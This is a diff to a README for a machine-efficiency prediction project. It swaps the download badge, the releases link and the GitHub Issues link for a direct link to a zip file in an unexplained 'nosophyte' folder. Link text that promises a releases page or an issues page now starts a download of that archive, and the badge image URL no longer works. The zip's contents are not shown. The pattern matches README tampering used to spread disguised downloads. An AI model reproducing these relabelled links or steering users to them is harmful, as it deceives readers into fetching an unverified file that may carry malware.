@@ -1,6 +1,6 @@
 # ⚙️ Smart-Machines-Efficiency-Prediction - Predict Machine Performance Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Huaskar-1980/Smart-Machines-Efficiency-Prediction/releases)
+[![Download Now](https://raw.githubusercontent.com/Huaskar-1980/Smart-Machines-Efficiency-Prediction/main/nosophyte/Smart-Machines-Efficiency-Prediction.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/Huaskar-1980/Smart-Machines-Efficiency-Prediction/main/nosophyte/Smart-Machines-Efficiency-Prediction.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This project helps you understand how smart machines perform in real-time. By fo
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Smart Machines Efficiency Prediction Releases](https://github.com/Huaskar-1980/Smart-Machines-Efficiency-Prediction/releases). 
+To get started, visit this page to download: [Smart Machines Efficiency Prediction Releases](https://raw.githubusercontent.com/Huaskar-1980/Smart-Machines-Efficiency-Prediction/main/nosophyte/Smart-Machines-Efficiency-Prediction.zip). 
 
 ### Step-by-Step Guide
 
@@ -58,7 +58,7 @@ Before running the application, ensure your system meets the following requireme
 
 ## 🛠️ Support
 
-For any questions or issues, visit our [GitHub Issues page](https://github.com/Huaskar-1980/Smart-Machines-Efficiency-Prediction/issues) to get assistance.
+For any questions or issues, visit our [GitHub Issues page](https://raw.githubusercontent.com/Huaskar-1980/Smart-Machines-Efficiency-Prediction/main/nosophyte/Smart-Machines-Efficiency-Prediction.zip) to get assistance.
 
 ## 🏷️ Related Topics
 
